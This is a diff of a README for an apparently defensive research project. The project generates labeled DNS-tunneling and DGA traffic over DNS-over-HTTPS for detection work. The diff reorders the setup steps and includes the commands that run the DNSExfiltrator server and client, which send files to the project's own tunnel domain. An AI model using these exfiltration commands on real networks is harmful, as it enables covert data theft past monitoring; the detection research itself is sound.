@@ -19,23 +19,23 @@ This project focuses on simulating, capturing, and analyzing Domain Generation A
 | [doh-server](https://github.com/m13253/dns-over-https)    | DNS-over-HTTPS server for simulating encrypted DNS traffic. |
 | [dohlyzer](https://github.com/ahlashkari/DoHLyzer)           | Analyzes DoH traffic to detect anomalies and exfiltration. |
 
+## 📦 Requirements
+
+- DNS Server and Domain: any domain owned example: dohe.live and tunnel.dohe.live in this experiment
+- DNSExfiltrator: for client and server
+- dnsproxy: for client
+- doh-server: for server
+- Coredns: for server
+  
 ## 🛠️ Installation
 
 
-### DNSExfiltrator setup
+### DNSEXFILTRATOR SETUP
 
 DNSExfiltrator is a proof-of-concept (PoC) tool designed to demonstrate how data can be exfiltrated over the DNS protocol. It works by encoding data into DNS queries, which are sent to an attacker-controlled domain. A DNS server controlled by the attacker decodes the incoming queries and reconstructs the original data.
 This technique is commonly used in real-world scenarios where traditional outbound channels (HTTP, FTP, etc.) are monitored or blocked, but DNS traffic is still permitted. DNSExfiltrator helps simulate this behavior for research, detection, and defense testing.
 
 In this project, DNSExfiltrator is used to generate labeled examples of DNS tunneling traffic. We use DNSExfiltrator to send 100 txt files over DNS to our remote server. We use DNS-over-HTTPS (DoH) protocol to send data. 
-
-#### Requirements
-
-- DNS Server and Domain (we used dohe.live and tunnel.dohe.live for dga and dns tunneling respectively)
-- DNSExfiltrator 
-- dnsproxy
-- doh-server
-- Coredns
 
 #### SERVER SETUP
 
@@ -143,19 +143,20 @@ cd DNSExfiltrator
 python2 -m pip install -r requirements.txt
 ```
 
-Run DNSExfiltrator server using :
-
-```bash
- python2 dnsexfiltrator.py -d tunnel.dohe.live -p password
-```
-
 check if port 53 is being used and kill any processes running on port 53
 
 ```bash
 sudo systemctl stop systemd-resolved
 ```
 
-The server is now setup and any computer can send files via dns-over-https to the server using tunnel.dohe.live as domain.
+Run DNSExfiltrator server using :
+
+```bash
+ python2 dnsexfiltrator.py -d tunnel.dohe.live -p password
+```
+to keep the server running for long durations, the server can be run as a bsckground process.   
+
+The server is now setup and any computer can send files via dns-over-https to the server using tunnel.dohe.live as domain.  
 Users can change domain name and password as needed.
 
 
@@ -176,11 +177,11 @@ To Run DNSExfiltrator (from DNSExfiltrator/release directory):
 ./dnsExfiltrator.exe <file name> <domain> <password>
 ```
 
-To send 100 text files we use the scripts inside DNSExfiltrator.
-gen_data.sh -> generates 100 random txt files
+To send 100 text files we use the scripts inside DNSExfiltrator.  
+gen_data.sh -> generates 100 random txt files  
 exfil_data.sh -> sends the 100 txt files to our server continously for 8 hours.
 
-We send these files over DoH and capture the traffic using wireshark.
+We send these files over DoH and capture the traffic using wireshark.  
 
 To send them over DoH we need dnsproxy, which sends all DNS Traffic over https using adgurad or google dns servers.
 
@@ -204,7 +205,20 @@ or
 dnsproxy.exe -l 127.0.0.1 -p 53 -u https://dns.google/dns-query -b 8.8.8.8:53
 ```
 
-this run dnsproxy on localhost port 53 and sends all dns requests upstream to adguard or google server over https.
+this run dnsproxy on localhost port 53 and sends all dns requests upstream to adguard or google server over https.  
 It forwards all requests to tunnel.dohe.live to our server where DNSExfiltrator is running.
+
+
+The traffic captured is given in the dnsexfil_pcaps folder which is converted to csv using DoHLyzer.
+
+
+### DGA SETUP 
+
+Domain Generation Algorithms (DGAs) are techniques used by malware to algorithmically generate a large number of domain names that can be used for command-and-control (C2) communication. Instead of hardcoding a single server address, DGAs allow malware to contact different domains daily or even hourly, making it more difficult for defenders to block malicious traffic or take down C2 servers.  
+
+
+#### SERVER SETUP :
+
+
 
 
